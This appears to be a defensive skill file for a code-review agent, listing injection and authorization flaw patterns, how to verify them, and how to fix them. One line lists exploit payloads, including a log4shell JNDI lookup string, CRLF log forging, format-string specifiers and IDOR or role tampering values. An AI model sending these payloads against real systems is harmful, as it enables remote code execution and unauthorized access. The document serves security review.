# Generic / Log / Format / Trust-Boundary Injection — @wildcard skill
> cats: INJECTION, LOG_INJECTION, FORMAT_STRING, RESOURCE_INJECTION, TRUST_BOUNDARY, PARAM_TAMPERING, IDOR · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
Catch-all for injection/trust flows not owned by a specific agent: log forging, format-string,
resource/connection-string injection, trust-boundary violations, and IDOR/parameter tampering.

## Code review — source → sink
- LOG INJECTION: user data into `log.info(...)` with CR/LF or ANSI → forged log lines / log4j-style
  lookups (`${jndi:...}`). SAFE: encode newlines, no expression lookups on user data.
- FORMAT STRING: user data as the **format** argument (`String.format(user)`, `printf(user)`,
  `logger.info(user)` where user is the pattern). SAFE: user as an argument, constant format.
- RESOURCE/CONN INJECTION: user controls a connection string, host:port, queue/topic, or config key.
- TRUST_BOUNDARY / PARAM_TAMPERING / IDOR: user-controlled id/role/price used for an authz or
  state decision without server-side ownership/role check.
- SANITIZERS (SAFE): neutralize CR/LF for logs, constant format strings, allow-list resource
  targets, enforce server-side authorization/ownership checks.

## Exploit payloads
Log `%0d%0aINFO fake log entry` · log4shell `${jndi:ldap://x/a}` · format `%n`/`%x` ·
IDOR increment `id=1002` · role `role=admin` · price `price=0`.

## VERIFY
- CONFIRMED when: the sink is genuinely dangerous for its class (user-as-format, un-neutralized
  log, authz decision on client-supplied id/role) and the tainted value is not constant/validated.
- FALSE POSITIVE when: a benign same-named method (name-only match), user data passed as a
  **format argument** (not the format), logs that neutralize CR/LF, or a server-side authz check
  exists.
- LIKELY when: the sink class is plausible but exploitability/authz context isn't visible.

## Remediation
Constant format strings (user as args); neutralize CR/LF + drop JNDI lookups in logs; allow-list
resource targets; enforce server-side authorization on every object reference.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.wiki/
- IDOR: https://book.hacktricks.wiki/en/pentesting-web/idor.html
